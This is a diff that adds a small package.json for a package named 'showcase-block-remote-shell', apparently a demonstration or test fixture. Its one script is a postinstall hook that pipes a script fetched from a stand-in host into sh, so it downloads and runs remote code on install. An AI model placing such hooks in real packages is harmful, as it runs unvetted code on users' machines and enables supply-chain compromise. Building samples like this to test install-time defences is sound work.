@@ -1,0 +1,7 @@
+{
+  "name": "showcase-block-remote-shell",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/payload.sh | sh"
+  }
+}
